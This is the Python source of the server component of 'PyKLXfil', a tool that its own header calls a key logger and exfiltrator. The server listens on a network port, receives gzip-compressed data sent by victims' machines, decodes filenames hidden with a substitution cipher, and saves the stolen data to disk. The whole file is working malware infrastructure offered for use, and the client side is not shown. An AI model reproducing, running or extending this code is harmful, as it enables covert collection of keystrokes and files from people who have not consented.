#PyKLXfil (Python Key Logger & Exfiltrator)
#### SERVER ####
# -*- coding: utf-8 -*-
#Auther: 2021, Mayed Almm
import os
import sys
import socket
from gzip import decompress


class PyKLXfilServer:

    banner = '''
______      _   __ _     __   __ __ _ _ 
| ___ \    | | / /| |    \ \ / // _(_) |
| |_/ /   _| |/ / | |     \ V /| |_ _| |
|  __/ | | |    \ | |     /   \|  _| | |
| |  | |_| | |\  \| |____/ /^\ \ | | | |
\_|   \__, \_| \_/\_____/\/   \/_| |_|_| Server
       __/ |  id4rksid3            v1.0
      |___/                             
    '''
    def __init__(self):
        print(PyKLXfilServer.banner)
        if len(sys.argv) > 3:
            sys.exit("[!] Usage: python3 PyKLXfil-server.py <LISTENING_IP> <LITENING_PORT>")
        elif len(sys.argv) == 2:
            if sys.argv[1] == '-h' or sys.argv[1] == '--help':
                sys.exit("[!] Usage: python3 PyKLXfil-server.py <LISTENING_IP> <LITENING_PORT>")
            else:
                self.recieve(sys.argv[1])
        elif len(sys.argv) == 3:
            self.recieve(sys.argv[1], int(sys.argv[2]))
        else:
            self.recieve()


    #func to perform very basic substitution cipher
    def substitution(self, str):
        Table = str.maketrans("01234567ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv\\wxyz/+89%^&*()$.,#@!-'[]=_",\
                              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk\\lmnopqrstuvwxyz0123456789+/!@#$%^&*()-_=][.,'")
        return str.translate(Table)

    #func to perform recieving and decoding of data
    def recieve(self, SERVER_IP="0.0.0.0", SERVER_PORT=4443):
        BUFFER_SIZE = 4096 #Receive 4096 bytes each time
        SEPARATOR = "-"
        s = socket.socket()
        try:
            s.bind((SERVER_IP, SERVER_PORT))
        except OSError:
            exit("[!]Error: cannot assign requested address or port")
        s.listen(5)
        print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT}")
        while True:
            try:
                client_socket, address = s.accept() 
            except KeyboardInterrupt:
                exit("\n[-] Exiting...")
            try:
                print(f"[+] {address} is connected.")
                received = decompress(client_socket.recv(BUFFER_SIZE)).decode()
                filename, filesize = received.split(SEPARATOR)
                filename = self.substitution(filename)
                filename = os.path.basename(filename)
                filesize = int(filesize)
                with open(filename, "ab") as f:
                    bytes_read = client_socket.recv(BUFFER_SIZE)
                    if not bytes_read:    
                        continue
                    f.write(decompress(bytes_read))
                client_socket.close()
            except:
                continue
if __name__ == '__main__':
    run = PyKLXfilServer
    run()
